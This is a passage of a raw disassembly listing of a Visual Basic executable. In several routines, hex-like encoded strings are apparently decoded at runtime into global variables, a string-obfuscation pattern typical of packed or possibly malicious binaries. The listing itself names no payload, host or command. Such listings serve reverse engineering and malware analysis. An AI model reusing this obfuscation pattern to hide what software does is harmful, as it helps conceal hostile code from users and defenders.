.text:0040A52A                 mov     [ebp+var_4], offset dword_401288
.text:0040A531                 mov     edx, offset aCrnonqgkpjjunp ; "crnonqgkpjjunpjl"
.text:0040A536                 lea     ecx, [ebp+var_18]
.text:0040A539                 call    __vbaStrCopy
.text:0040A53E                 call    rtcErrObj
.text:0040A543                 push    eax
.text:0040A544                 lea     eax, [ebp+var_1C]
.text:0040A547                 push    eax
.text:0040A548                 call    __vbaObjSet
.text:0040A54D                 mov     [ebp+var_A0], eax
.text:0040A553                 mov     [ebp+var_54], 80020004h
.text:0040A55A                 mov     [ebp+var_5C], 0Ah
.text:0040A561                 mov     [ebp+var_44], 80020004h
.text:0040A568                 mov     [ebp+var_4C], 0Ah
.text:0040A56F                 mov     [ebp+var_34], 80020004h
.text:0040A576                 mov     [ebp+var_3C], 0Ah
.text:0040A57D                 mov     [ebp+var_24], 80020004h
.text:0040A584                 mov     [ebp+var_2C], 0Ah
.text:0040A58B                 lea     eax, [ebp+var_5C]
.text:0040A58E                 push    eax
.text:0040A58F                 lea     eax, [ebp+var_4C]
.text:0040A592                 push    eax
.text:0040A593                 lea     eax, [ebp+var_3C]
.text:0040A596                 push    eax
.text:0040A597                 lea     eax, [ebp+var_2C]
.text:0040A59A                 push    eax
.text:0040A59B                 push    8
.text:0040A59D                 mov     eax, [ebp+var_A0]
.text:0040A5A3                 mov     eax, [eax]
.text:0040A5A5                 push    [ebp+var_A0]
.text:0040A5AB                 call    dword ptr [eax+44h]
.text:0040A5AE                 fnclex
.text:0040A5B0                 mov     [ebp+var_A4], eax
.text:0040A5B6                 cmp     [ebp+var_A4], 0
.text:0040A5BD                 jge     short loc_40A5DF
.text:0040A5BF                 push    44h ; 'D'
.text:0040A5C1                 push    offset dword_403D0C
.text:0040A5C6                 push    [ebp+var_A0]
.text:0040A5CC                 push    [ebp+var_A4]
.text:0040A5D2                 call    __vbaHresultCheckObj
.text:0040A5D7                 mov     [ebp+var_AC], eax
.text:0040A5DD                 jmp     short loc_40A5E6
.text:0040A5DF ; ---------------------------------------------------------------------------
.text:0040A5DF
.text:0040A5DF loc_40A5DF:                             ; CODE XREF: sub_40A502+BB↑j
.text:0040A5DF                 and     [ebp+var_AC], 0
.text:0040A5E6
.text:0040A5E6 loc_40A5E6:                             ; CODE XREF: sub_40A502+DB↑j
.text:0040A5E6                 lea     ecx, [ebp+var_1C]
.text:0040A5E9                 call    __vbaFreeObj
.text:0040A5EE                 lea     eax, [ebp+var_5C]
.text:0040A5F1                 push    eax
.text:0040A5F2                 lea     eax, [ebp+var_4C]
.text:0040A5F5                 push    eax
.text:0040A5F6                 lea     eax, [ebp+var_3C]
.text:0040A5F9                 push    eax
.text:0040A5FA                 lea     eax, [ebp+var_2C]
.text:0040A5FD                 push    eax
.text:0040A5FE                 push    4
.text:0040A600                 call    __vbaFreeVarList
.text:0040A605                 add     esp, 14h
.text:0040A608                 push    offset loc_40A63B
.text:0040A60D                 jmp     short loc_40A632
.text:0040A60F ; ---------------------------------------------------------------------------
.text:0040A60F
.text:0040A60F loc_40A60F:                             ; DATA XREF: .text:00401294↑o
.text:0040A60F                 lea     ecx, [ebp+var_1C]
.text:0040A612                 call    __vbaFreeObj
.text:0040A617                 lea     eax, [ebp+var_5C]
.text:0040A61A                 push    eax
.text:0040A61B                 lea     eax, [ebp+var_4C]
.text:0040A61E                 push    eax
.text:0040A61F                 lea     eax, [ebp+var_3C]
.text:0040A622                 push    eax
.text:0040A623                 lea     eax, [ebp+var_2C]
.text:0040A626                 push    eax
.text:0040A627                 push    4
.text:0040A629                 call    __vbaFreeVarList
.text:0040A62E                 add     esp, 14h
.text:0040A631                 retn
.text:0040A632 ; ---------------------------------------------------------------------------
.text:0040A632
.text:0040A632 loc_40A632:                             ; CODE XREF: sub_40A502+10B↑j
.text:0040A632                                         ; DATA XREF: .text:00401290↑o
.text:0040A632                 lea     ecx, [ebp+var_18]
.text:0040A635                 call    __vbaFreeStr
.text:0040A63A                 retn
.text:0040A63B ; ---------------------------------------------------------------------------
.text:0040A63B
.text:0040A63B loc_40A63B:                             ; DATA XREF: sub_40A502+106↑o
.text:0040A63B                 mov     eax, [ebp+var_14]
.text:0040A63E                 mov     ecx, [ebp+var_10]
.text:0040A641                 mov     large fs:0, ecx
.text:0040A648                 pop     edi
.text:0040A649                 pop     esi
.text:0040A64A                 pop     ebx
.text:0040A64B                 leave
.text:0040A64C                 retn    14h
.text:0040A64C sub_40A502      endp ; sp-analysis failed
.text:0040A64C
.text:0040A64F
.text:0040A64F ; =============== S U B R O U T I N E =======================================
.text:0040A64F
.text:0040A64F ; Attributes: bp-based frame
.text:0040A64F
.text:0040A64F sub_40A64F      proc near               ; CODE XREF: sub_40D3DE+2D↓p
.text:0040A64F
.text:0040A64F var_4C          = dword ptr -4Ch
.text:0040A64F var_48          = dword ptr -48h
.text:0040A64F var_44          = dword ptr -44h
.text:0040A64F var_40          = dword ptr -40h
.text:0040A64F var_3C          = dword ptr -3Ch
.text:0040A64F var_38          = dword ptr -38h
.text:0040A64F var_34          = dword ptr -34h
.text:0040A64F var_30          = dword ptr -30h
.text:0040A64F var_2C          = dword ptr -2Ch
.text:0040A64F var_28          = dword ptr -28h
.text:0040A64F var_24          = dword ptr -24h
.text:0040A64F var_20          = dword ptr -20h
.text:0040A64F var_1C          = dword ptr -1Ch
.text:0040A64F var_18          = dword ptr -18h
.text:0040A64F var_14          = dword ptr -14h
.text:0040A64F var_10          = dword ptr -10h
.text:0040A64F var_C           = dword ptr -0Ch
.text:0040A64F var_8           = dword ptr -8
.text:0040A64F var_4           = dword ptr -4
.text:0040A64F
.text:0040A64F                 push    ebp
.text:0040A650                 mov     ebp, esp
.text:0040A652                 push    4Ch ; 'L'
.text:0040A654                 pop     eax
.text:0040A655                 call    __vbaChkstk
.text:0040A65A                 push    offset unk_40E12C
.text:0040A65F                 call    sub_40A464
.text:0040A664                 mov     [ebp+var_34], eax
.text:0040A667                 cmp     dword_40E0AC, 0
.text:0040A66E                 jnz     short loc_40A688
.text:0040A670                 push    offset dword_40E0AC
.text:0040A675                 push    offset dword_401960
.text:0040A67A                 call    __vbaNew2
.text:0040A67F                 mov     [ebp+var_40], offset dword_40E0AC
.text:0040A686                 jmp     short loc_40A68F
.text:0040A688 ; ---------------------------------------------------------------------------
.text:0040A688
.text:0040A688 loc_40A688:                             ; CODE XREF: sub_40A64F+1F↑j
.text:0040A688                 mov     [ebp+var_40], offset dword_40E0AC
.text:0040A68F
.text:0040A68F loc_40A68F:                             ; CODE XREF: sub_40A64F+37↑j
.text:0040A68F                 mov     eax, [ebp+var_40]
.text:0040A692                 mov     eax, [eax]
.text:0040A694                 mov     [ebp+var_38], eax
.text:0040A697                 and     [ebp+var_2C], 0
.text:0040A69B                 and     [ebp+var_28], 0
.text:0040A69F                 and     [ebp+var_24], 0
.text:0040A6A3                 and     [ebp+var_20], 0
.text:0040A6A7                 and     [ebp+var_1C], 0
.text:0040A6AB                 and     [ebp+var_18], 0
.text:0040A6AF                 and     [ebp+var_14], 0
.text:0040A6B3                 and     [ebp+var_10], 0
.text:0040A6B7                 mov     eax, [ebp+var_34]
.text:0040A6BA                 mov     [ebp+var_C], eax
.text:0040A6BD                 mov     [ebp+var_8], 1
.text:0040A6C4                 lea     eax, [ebp+var_30]
.text:0040A6C7                 push    eax
.text:0040A6C8                 lea     eax, [ebp+var_2C]
.text:0040A6CB                 push    eax
.text:0040A6CC                 lea     eax, [ebp+var_28]
.text:0040A6CF                 push    eax
.text:0040A6D0                 lea     eax, [ebp+var_24]
.text:0040A6D3                 push    eax
.text:0040A6D4                 lea     eax, [ebp+var_20]
.text:0040A6D7                 push    eax
.text:0040A6D8                 lea     eax, [ebp+var_1C]
.text:0040A6DB                 push    eax
.text:0040A6DC                 lea     eax, [ebp+var_18]
.text:0040A6DF                 push    eax
.text:0040A6E0                 lea     eax, [ebp+var_14]
.text:0040A6E3                 push    eax
.text:0040A6E4                 lea     eax, [ebp+var_10]
.text:0040A6E7                 push    eax
.text:0040A6E8                 lea     eax, [ebp+var_C]
.text:0040A6EB                 push    eax
.text:0040A6EC                 lea     eax, [ebp+var_8]
.text:0040A6EF                 push    eax
.text:0040A6F0                 push    dword_40E158
.text:0040A6F6                 push    dword_40E078
.text:0040A6FC                 mov     eax, [ebp+var_38]
.text:0040A6FF                 mov     eax, [eax]
.text:0040A701                 push    [ebp+var_38]
.text:0040A704                 call    dword ptr [eax+30h]
.text:0040A707                 fnclex
.text:0040A709                 mov     [ebp+var_3C], eax
.text:0040A70C                 cmp     [ebp+var_3C], 0
.text:0040A710                 jge     short loc_40A729
.text:0040A712                 push    30h ; '0'
.text:0040A714                 push    offset dword_4027CC
.text:0040A719                 push    [ebp+var_38]
.text:0040A71C                 push    [ebp+var_3C]
.text:0040A71F                 call    __vbaHresultCheckObj
.text:0040A724                 mov     [ebp+var_44], eax
.text:0040A727                 jmp     short loc_40A72D
.text:0040A729 ; ---------------------------------------------------------------------------
.text:0040A729
.text:0040A729 loc_40A729:                             ; CODE XREF: sub_40A64F+C1↑j
.text:0040A729                 and     [ebp+var_44], 0
.text:0040A72D
.text:0040A72D loc_40A72D:                             ; CODE XREF: sub_40A64F+D8↑j
.text:0040A72D                 mov     eax, [ebp+var_30]
.text:0040A730                 mov     [ebp+var_4], eax
.text:0040A733                 cmp     [ebp+var_4], 0
.text:0040A737                 jle     locret_40A804
.text:0040A73D                 cmp     dword_40E0AC, 0
.text:0040A744                 jnz     short loc_40A75E
.text:0040A746                 push    offset dword_40E0AC
.text:0040A74B                 push    offset dword_401960
.text:0040A750                 call    __vbaNew2
.text:0040A755                 mov     [ebp+var_48], offset dword_40E0AC
.text:0040A75C                 jmp     short loc_40A765
.text:0040A75E ; ---------------------------------------------------------------------------
.text:0040A75E
.text:0040A75E loc_40A75E:                             ; CODE XREF: sub_40A64F+F5↑j
.text:0040A75E                 mov     [ebp+var_48], offset dword_40E0AC
.text:0040A765
.text:0040A765 loc_40A765:                             ; CODE XREF: sub_40A64F+10D↑j
.text:0040A765                 mov     eax, [ebp+var_48]
.text:0040A768                 mov     eax, [eax]
.text:0040A76A                 mov     [ebp+var_38], eax
.text:0040A76D                 and     [ebp+var_2C], 0
.text:0040A771                 and     [ebp+var_28], 0
.text:0040A775                 and     [ebp+var_24], 0
.text:0040A779                 and     [ebp+var_20], 0
.text:0040A77D                 and     [ebp+var_1C], 0
.text:0040A781                 and     [ebp+var_18], 0
.text:0040A785                 and     [ebp+var_14], 0
.text:0040A789                 and     [ebp+var_10], 0
.text:0040A78D                 mov     [ebp+var_C], 3E80h
.text:0040A794                 mov     [ebp+var_8], 1
.text:0040A79B                 lea     eax, [ebp+var_30]
.text:0040A79E                 push    eax
.text:0040A79F                 lea     eax, [ebp+var_2C]
.text:0040A7A2                 push    eax
.text:0040A7A3                 lea     eax, [ebp+var_28]
.text:0040A7A6                 push    eax
.text:0040A7A7                 lea     eax, [ebp+var_24]
.text:0040A7AA                 push    eax
.text:0040A7AB                 lea     eax, [ebp+var_20]
.text:0040A7AE                 push    eax
.text:0040A7AF                 lea     eax, [ebp+var_1C]
.text:0040A7B2                 push    eax
.text:0040A7B3                 lea     eax, [ebp+var_18]
.text:0040A7B6                 push    eax
.text:0040A7B7                 lea     eax, [ebp+var_14]
.text:0040A7BA                 push    eax
.text:0040A7BB                 lea     eax, [ebp+var_10]
.text:0040A7BE                 push    eax
.text:0040A7BF                 lea     eax, [ebp+var_C]
.text:0040A7C2                 push    eax
.text:0040A7C3                 lea     eax, [ebp+var_8]
.text:0040A7C6                 push    eax
.text:0040A7C7                 push    dword_40E088
.text:0040A7CD                 push    dword_40E078
.text:0040A7D3                 mov     eax, [ebp+var_38]
.text:0040A7D6                 mov     eax, [eax]
.text:0040A7D8                 push    [ebp+var_38]
.text:0040A7DB                 call    dword ptr [eax+30h]
.text:0040A7DE                 fnclex
.text:0040A7E0                 mov     [ebp+var_3C], eax
.text:0040A7E3                 cmp     [ebp+var_3C], 0
.text:0040A7E7                 jge     short loc_40A800
.text:0040A7E9                 push    30h ; '0'
.text:0040A7EB                 push    offset dword_4027CC
.text:0040A7F0                 push    [ebp+var_38]
.text:0040A7F3                 push    [ebp+var_3C]
.text:0040A7F6                 call    __vbaHresultCheckObj
.text:0040A7FB                 mov     [ebp+var_4C], eax
.text:0040A7FE                 jmp     short locret_40A804
.text:0040A800 ; ---------------------------------------------------------------------------
.text:0040A800
.text:0040A800 loc_40A800:                             ; CODE XREF: sub_40A64F+198↑j
.text:0040A800                 and     [ebp+var_4C], 0
.text:0040A804
.text:0040A804 locret_40A804:                          ; CODE XREF: sub_40A64F+E8↑j
.text:0040A804                                         ; sub_40A64F+1AF↑j
.text:0040A804                 leave
.text:0040A805                 retn
.text:0040A805 sub_40A64F      endp ; sp-analysis failed
.text:0040A805
.text:0040A806
.text:0040A806 ; =============== S U B R O U T I N E =======================================
.text:0040A806
.text:0040A806 ; Attributes: bp-based frame
.text:0040A806
.text:0040A806 sub_40A806      proc near               ; CODE XREF: sub_40BF67+10↓p
.text:0040A806
.text:0040A806 var_110         = dword ptr -110h
.text:0040A806 var_10C         = dword ptr -10Ch
.text:0040A806 var_108         = dword ptr -108h
.text:0040A806 var_104         = dword ptr -104h
.text:0040A806 var_100         = dword ptr -100h
.text:0040A806 var_FC          = dword ptr -0FCh
.text:0040A806 var_F8          = dword ptr -0F8h
.text:0040A806 var_F4          = dword ptr -0F4h
.text:0040A806 var_F0          = dword ptr -0F0h
.text:0040A806 var_EC          = dword ptr -0ECh
.text:0040A806 var_E8          = dword ptr -0E8h
.text:0040A806 var_E4          = dword ptr -0E4h
.text:0040A806 var_E0          = dword ptr -0E0h
.text:0040A806 var_DC          = dword ptr -0DCh
.text:0040A806 var_D8          = dword ptr -0D8h
.text:0040A806 var_D4          = dword ptr -0D4h
.text:0040A806 var_D0          = dword ptr -0D0h
.text:0040A806 var_CC          = dword ptr -0CCh
.text:0040A806 var_C8          = dword ptr -0C8h
.text:0040A806 var_C4          = dword ptr -0C4h
.text:0040A806 var_C0          = dword ptr -0C0h
.text:0040A806 var_BC          = dword ptr -0BCh
.text:0040A806 var_B8          = dword ptr -0B8h
.text:0040A806 var_B4          = dword ptr -0B4h
.text:0040A806 var_B0          = dword ptr -0B0h
.text:0040A806 var_AC          = dword ptr -0ACh
.text:0040A806 var_A8          = dword ptr -0A8h
.text:0040A806 var_A4          = dword ptr -0A4h
.text:0040A806 var_A0          = dword ptr -0A0h
.text:0040A806 var_9C          = dword ptr -9Ch
.text:0040A806 var_98          = dword ptr -98h
.text:0040A806 var_94          = dword ptr -94h
.text:0040A806 var_90          = dword ptr -90h
.text:0040A806 var_8C          = dword ptr -8Ch
.text:0040A806 var_88          = dword ptr -88h
.text:0040A806 var_84          = dword ptr -84h
.text:0040A806 var_80          = dword ptr -80h
.text:0040A806 var_7C          = dword ptr -7Ch
.text:0040A806 var_78          = dword ptr -78h
.text:0040A806 var_74          = dword ptr -74h
.text:0040A806 var_70          = dword ptr -70h
.text:0040A806 var_6C          = dword ptr -6Ch
.text:0040A806 var_68          = dword ptr -68h
.text:0040A806 var_64          = dword ptr -64h
.text:0040A806 var_60          = dword ptr -60h
.text:0040A806 var_5C          = dword ptr -5Ch
.text:0040A806 var_58          = dword ptr -58h
.text:0040A806 var_54          = dword ptr -54h
.text:0040A806 var_50          = dword ptr -50h
.text:0040A806 var_4C          = dword ptr -4Ch
.text:0040A806 var_48          = dword ptr -48h
.text:0040A806 var_44          = dword ptr -44h
.text:0040A806 var_40          = dword ptr -40h
.text:0040A806 var_3C          = dword ptr -3Ch
.text:0040A806 var_38          = dword ptr -38h
.text:0040A806 var_34          = dword ptr -34h
.text:0040A806 var_30          = dword ptr -30h
.text:0040A806 var_2C          = dword ptr -2Ch
.text:0040A806 var_28          = dword ptr -28h
.text:0040A806 var_20          = dword ptr -20h
.text:0040A806 var_1C          = dword ptr -1Ch
.text:0040A806 var_18          = dword ptr -18h
.text:0040A806 var_14          = dword ptr -14h
.text:0040A806 var_10          = dword ptr -10h
.text:0040A806 var_8           = dword ptr -8
.text:0040A806 var_4           = dword ptr -4
.text:0040A806
.text:0040A806                 push    ebp
.text:0040A807                 mov     ebp, esp
.text:0040A809                 push    ecx
.text:0040A80A                 push    ecx
.text:0040A80B                 push    offset __vbaExceptHandler
.text:0040A810                 mov     eax, large fs:0
.text:0040A816                 push    eax
.text:0040A817                 mov     large fs:0, esp
.text:0040A81E                 mov     eax, 100h
.text:0040A823                 call    __vbaChkstk
.text:0040A828                 push    ebx
.text:0040A829                 push    esi
.text:0040A82A                 push    edi
.text:0040A82B                 mov     [ebp+var_8], esp
.text:0040A82E                 mov     [ebp+var_4], offset dword_4012C0
.text:0040A835                 cmp     dword_40E0AC, 0
.text:0040A83C                 jnz     short loc_40A856
.text:0040A83E                 push    offset dword_40E0AC
.text:0040A843                 push    offset dword_401960
.text:0040A848                 call    __vbaNew2
.text:0040A84D                 mov     [ebp+var_74], offset dword_40E0AC
.text:0040A854                 jmp     short loc_40A85D
.text:0040A856 ; ---------------------------------------------------------------------------
.text:0040A856
.text:0040A856 loc_40A856:                             ; CODE XREF: sub_40A806+36↑j
.text:0040A856                 mov     [ebp+var_74], offset dword_40E0AC
.text:0040A85D
.text:0040A85D loc_40A85D:                             ; CODE XREF: sub_40A806+4E↑j
.text:0040A85D                 mov     eax, [ebp+var_74]
.text:0040A860                 mov     eax, [eax]
.text:0040A862                 mov     [ebp+var_1C], eax
.text:0040A865                 fld     ds:flt_4012BC
.text:0040A86B                 fstp    [ebp+var_18]
.text:0040A86E                 lea     eax, [ebp+var_14]
.text:0040A871                 push    eax
.text:0040A872                 push    0
.text:0040A874                 lea     eax, [ebp+var_18]
.text:0040A877                 push    eax
.text:0040A878                 push    offset aG94a2a9a1ab9e8 ; "G94a2a9a1ab9e85a2a9b2a1ac8ab1a284"
.text:0040A87D                 mov     eax, [ebp+var_1C]
.text:0040A880                 mov     eax, [eax]
.text:0040A882                 push    [ebp+var_1C]
.text:0040A885                 call    dword ptr [eax+24h]
.text:0040A888                 fnclex
.text:0040A88A                 mov     [ebp+var_20], eax
.text:0040A88D                 cmp     [ebp+var_20], 0
.text:0040A891                 jge     short loc_40A8AA
.text:0040A893                 push    24h ; '$'
.text:0040A895                 push    offset dword_4027CC
.text:0040A89A                 push    [ebp+var_1C]
.text:0040A89D                 push    [ebp+var_20]
.text:0040A8A0                 call    __vbaHresultCheckObj
.text:0040A8A5                 mov     [ebp+var_78], eax
.text:0040A8A8                 jmp     short loc_40A8AE
.text:0040A8AA ; ---------------------------------------------------------------------------
.text:0040A8AA
.text:0040A8AA loc_40A8AA:                             ; CODE XREF: sub_40A806+8B↑j
.text:0040A8AA                 and     [ebp+var_78], 0
.text:0040A8AE
.text:0040A8AE loc_40A8AE:                             ; CODE XREF: sub_40A806+A2↑j
.text:0040A8AE                 mov     eax, [ebp+var_14]
.text:0040A8B1                 mov     [ebp+var_28], eax
.text:0040A8B4                 and     [ebp+var_14], 0
.text:0040A8B8                 mov     edx, [ebp+var_28]
.text:0040A8BB                 mov     ecx, offset dword_40E158
.text:0040A8C0                 call    __vbaStrMove
.text:0040A8C5                 cmp     dword_40E0AC, 0
.text:0040A8CC                 jnz     short loc_40A8E6
.text:0040A8CE                 push    offset dword_40E0AC
.text:0040A8D3                 push    offset dword_401960
.text:0040A8D8                 call    __vbaNew2
.text:0040A8DD                 mov     [ebp+var_7C], offset dword_40E0AC
.text:0040A8E4                 jmp     short loc_40A8ED
.text:0040A8E6 ; ---------------------------------------------------------------------------
.text:0040A8E6
.text:0040A8E6 loc_40A8E6:                             ; CODE XREF: sub_40A806+C6↑j
.text:0040A8E6                 mov     [ebp+var_7C], offset dword_40E0AC
.text:0040A8ED
.text:0040A8ED loc_40A8ED:                             ; CODE XREF: sub_40A806+DE↑j
.text:0040A8ED                 mov     eax, [ebp+var_7C]
.text:0040A8F0                 mov     eax, [eax]
.text:0040A8F2                 mov     [ebp+var_1C], eax
.text:0040A8F5                 fld     ds:flt_4011F8
.text:0040A8FB                 fstp    [ebp+var_18]
.text:0040A8FE                 lea     eax, [ebp+var_14]
.text:0040A901                 push    eax
.text:0040A902                 push    0
.text:0040A904                 lea     eax, [ebp+var_18]
.text:0040A907                 push    eax
.text:0040A908                 push    offset aI7878703a77748 ; "I7878703a7774847a7f"
.text:0040A90D                 mov     eax, [ebp+var_1C]
.text:0040A910                 mov     eax, [eax]
.text:0040A912                 push    [ebp+var_1C]
.text:0040A915                 call    dword ptr [eax+24h]
.text:0040A918                 fnclex
.text:0040A91A                 mov     [ebp+var_20], eax
.text:0040A91D                 cmp     [ebp+var_20], 0
.text:0040A921                 jge     short loc_40A93A
.text:0040A923                 push    24h ; '$'
.text:0040A925                 push    offset dword_4027CC
.text:0040A92A                 push    [ebp+var_1C]
.text:0040A92D                 push    [ebp+var_20]
.text:0040A930                 call    __vbaHresultCheckObj
.text:0040A935                 mov     [ebp+var_80], eax
.text:0040A938                 jmp     short loc_40A93E
.text:0040A93A ; ---------------------------------------------------------------------------
.text:0040A93A
.text:0040A93A loc_40A93A:                             ; CODE XREF: sub_40A806+11B↑j
.text:0040A93A                 and     [ebp+var_80], 0
.text:0040A93E
.text:0040A93E loc_40A93E:                             ; CODE XREF: sub_40A806+132↑j
.text:0040A93E                 mov     eax, [ebp+var_14]
.text:0040A941                 mov     [ebp+var_2C], eax
.text:0040A944                 and     [ebp+var_14], 0
.text:0040A948                 mov     edx, [ebp+var_2C]
.text:0040A94B                 mov     ecx, offset unk_40E12C
.text:0040A950                 call    __vbaStrMove
.text:0040A955                 cmp     dword_40E0AC, 0
.text:0040A95C                 jnz     short loc_40A979
.text:0040A95E                 push    offset dword_40E0AC
.text:0040A963                 push    offset dword_401960
.text:0040A968                 call    __vbaNew2
.text:0040A96D                 mov     [ebp+var_84], offset dword_40E0AC
.text:0040A977                 jmp     short loc_40A983
.text:0040A979 ; ---------------------------------------------------------------------------
.text:0040A979
.text:0040A979 loc_40A979:                             ; CODE XREF: sub_40A806+156↑j
.text:0040A979                 mov     [ebp+var_84], offset dword_40E0AC
.text:0040A983
.text:0040A983 loc_40A983:                             ; CODE XREF: sub_40A806+171↑j
.text:0040A983                 mov     eax, [ebp+var_84]
.text:0040A989                 mov     eax, [eax]
.text:0040A98B                 mov     [ebp+var_1C], eax
.text:0040A98E                 fld     ds:flt_4012B8
.text:0040A994                 fstp    [ebp+var_18]
.text:0040A997                 lea     eax, [ebp+var_14]
.text:0040A99A                 push    eax
.text:0040A99B                 push    0
.text:0040A99D                 lea     eax, [ebp+var_18]
.text:0040A9A0                 push    eax
.text:0040A9A1                 push    offset aS61786f767c7e7 ; "S61786f767c7e7d76"
.text:0040A9A6                 mov     eax, [ebp+var_1C]
.text:0040A9A9                 mov     eax, [eax]
.text:0040A9AB                 push    [ebp+var_1C]
.text:0040A9AE                 call    dword ptr [eax+24h]
.text:0040A9B1                 fnclex
.text:0040A9B3                 mov     [ebp+var_20], eax
.text:0040A9B6                 cmp     [ebp+var_20], 0
.text:0040A9BA                 jge     short loc_40A9D6
.text:0040A9BC                 push    24h ; '$'
.text:0040A9BE                 push    offset dword_4027CC
.text:0040A9C3                 push    [ebp+var_1C]
.text:0040A9C6                 push    [ebp+var_20]
.text:0040A9C9                 call    __vbaHresultCheckObj
.text:0040A9CE                 mov     [ebp+var_88], eax
.text:0040A9D4                 jmp     short loc_40A9DD
.text:0040A9D6 ; ---------------------------------------------------------------------------
.text:0040A9D6
.text:0040A9D6 loc_40A9D6:                             ; CODE XREF: sub_40A806+1B4↑j
.text:0040A9D6                 and     [ebp+var_88], 0
.text:0040A9DD
.text:0040A9DD loc_40A9DD:                             ; CODE XREF: sub_40A806+1CE↑j
.text:0040A9DD                 mov     eax, [ebp+var_14]
.text:0040A9E0                 mov     [ebp+var_30], eax
.text:0040A9E3                 and     [ebp+var_14], 0
.text:0040A9E7                 mov     edx, [ebp+var_30]
.text:0040A9EA                 mov     ecx, offset unk_40E134
.text:0040A9EF                 call    __vbaStrMove
.text:0040A9F4                 cmp     dword_40E0AC, 0
.text:0040A9FB                 jnz     short loc_40AA18
.text:0040A9FD                 push    offset dword_40E0AC
.text:0040AA02                 push    offset dword_401960
.text:0040AA07                 call    __vbaNew2
.text:0040AA0C                 mov     [ebp+var_8C], offset dword_40E0AC
.text:0040AA16                 jmp     short loc_40AA22
.text:0040AA18 ; ---------------------------------------------------------------------------
.text:0040AA18
.text:0040AA18 loc_40AA18:                             ; CODE XREF: sub_40A806+1F5↑j
.text:0040AA18                 mov     [ebp+var_8C], offset dword_40E0AC
.text:0040AA22
.text:0040AA22 loc_40AA22:                             ; CODE XREF: sub_40A806+210↑j
.text:0040AA22                 mov     eax, [ebp+var_8C]
.text:0040AA28                 mov     eax, [eax]
.text:0040AA2A                 mov     [ebp+var_1C], eax
.text:0040AA2D                 fld     ds:flt_4011C8
.text:0040AA33                 fstp    [ebp+var_18]
.text:0040AA36                 lea     eax, [ebp+var_14]
.text:0040AA39                 push    eax
.text:0040AA3A                 push    0
.text:0040AA3C                 lea     eax, [ebp+var_18]
.text:0040AA3F                 push    eax
.text:0040AA40                 push    offset aWc7c7bf898d8ec ; "Wc7c7bf898d8ec7c0c9cdc0c6"
.text:0040AA45                 mov     eax, [ebp+var_1C]
.text:0040AA48                 mov     eax, [eax]
.text:0040AA4A                 push    [ebp+var_1C]
.text:0040AA4D                 call    dword ptr [eax+24h]
.text:0040AA50                 fnclex
.text:0040AA52                 mov     [ebp+var_20], eax
.text:0040AA55                 cmp     [ebp+var_20], 0
.text:0040AA59                 jge     short loc_40AA75
.text:0040AA5B                 push    24h ; '$'
.text:0040AA5D                 push    offset dword_4027CC
.text:0040AA62                 push    [ebp+var_1C]
.text:0040AA65                 push    [ebp+var_20]
.text:0040AA68                 call    __vbaHresultCheckObj
.text:0040AA6D                 mov     [ebp+var_90], eax
.text:0040AA73                 jmp     short loc_40AA7C
.text:0040AA75 ; ---------------------------------------------------------------------------
.text:0040AA75
.text:0040AA75 loc_40AA75:                             ; CODE XREF: sub_40A806+253↑j
.text:0040AA75                 and     [ebp+var_90], 0
.text:0040AA7C
.text:0040AA7C loc_40AA7C:                             ; CODE XREF: sub_40A806+26D↑j
.text:0040AA7C                 mov     eax, [ebp+var_14]
.text:0040AA7F                 mov     [ebp+var_34], eax
.text:0040AA82                 and     [ebp+var_14], 0
.text:0040AA86                 mov     edx, [ebp+var_34]
.text:0040AA89                 mov     ecx, offset dword_40E078
.text:0040AA8E                 call    __vbaStrMove
.text:0040AA93                 cmp     dword_40E0AC, 0
.text:0040AA9A                 jnz     short loc_40AAB7
.text:0040AA9C                 push    offset dword_40E0AC
.text:0040AAA1                 push    offset dword_401960
.text:0040AAA6                 call    __vbaNew2
.text:0040AAAB                 mov     [ebp+var_94], offset dword_40E0AC
.text:0040AAB5                 jmp     short loc_40AAC1
.text:0040AAB7 ; ---------------------------------------------------------------------------
.text:0040AAB7
.text:0040AAB7 loc_40AAB7:                             ; CODE XREF: sub_40A806+294↑j
.text:0040AAB7                 mov     [ebp+var_94], offset dword_40E0AC
.text:0040AAC1
.text:0040AAC1 loc_40AAC1:                             ; CODE XREF: sub_40A806+2AF↑j
.text:0040AAC1                 mov     eax, [ebp+var_94]
.text:0040AAC7                 mov     eax, [eax]
.text:0040AAC9                 mov     [ebp+var_1C], eax
.text:0040AACC                 fld     ds:flt_4012B4
.text:0040AAD2                 fstp    [ebp+var_18]
.text:0040AAD5                 lea     eax, [ebp+var_14]
.text:0040AAD8                 push    eax
.text:0040AAD9                 push    0
.text:0040AADB                 lea     eax, [ebp+var_18]
.text:0040AADE                 push    eax
.text:0040AADF                 push    offset aY8486855480818 ; "y848685548081847b888057758684"
.text:0040AAE4                 mov     eax, [ebp+var_1C]
.text:0040AAE7                 mov     eax, [eax]
.text:0040AAE9                 push    [ebp+var_1C]
.text:0040AAEC                 call    dword ptr [eax+24h]
.text:0040AAEF                 fnclex
.text:0040AAF1                 mov     [ebp+var_20], eax
.text:0040AAF4                 cmp     [ebp+var_20], 0
.text:0040AAF8                 jge     short loc_40AB14
.text:0040AAFA                 push    24h ; '$'
.text:0040AAFC                 push    offset dword_4027CC
.text:0040AB01                 push    [ebp+var_1C]
.text:0040AB04                 push    [ebp+var_20]
.text:0040AB07                 call    __vbaHresultCheckObj
.text:0040AB0C                 mov     [ebp+var_98], eax
.text:0040AB12                 jmp     short loc_40AB1B
.text:0040AB14 ; ---------------------------------------------------------------------------
.text:0040AB14
.text:0040AB14 loc_40AB14:                             ; CODE XREF: sub_40A806+2F2↑j
.text:0040AB14                 and     [ebp+var_98], 0
.text:0040AB1B
.text:0040AB1B loc_40AB1B:                             ; CODE XREF: sub_40A806+30C↑j
.text:0040AB1B                 mov     eax, [ebp+var_14]
.text:0040AB1E                 mov     [ebp+var_38], eax
.text:0040AB21                 and     [ebp+var_14], 0
.text:0040AB25                 mov     edx, [ebp+var_38]
.text:0040AB28                 mov     ecx, offset unk_40E0F4
.text:0040AB2D                 call    __vbaStrMove
.text:0040AB32                 cmp     dword_40E0AC, 0
.text:0040AB39                 jnz     short loc_40AB56
.text:0040AB3B                 push    offset dword_40E0AC
.text:0040AB40                 push    offset dword_401960
.text:0040AB45                 call    __vbaNew2
.text:0040AB4A                 mov     [ebp+var_9C], offset dword_40E0AC
.text:0040AB54                 jmp     short loc_40AB60
.text:0040AB56 ; ---------------------------------------------------------------------------
.text:0040AB56
.text:0040AB56 loc_40AB56:                             ; CODE XREF: sub_40A806+333↑j
.text:0040AB56                 mov     [ebp+var_9C], offset dword_40E0AC
.text:0040AB60
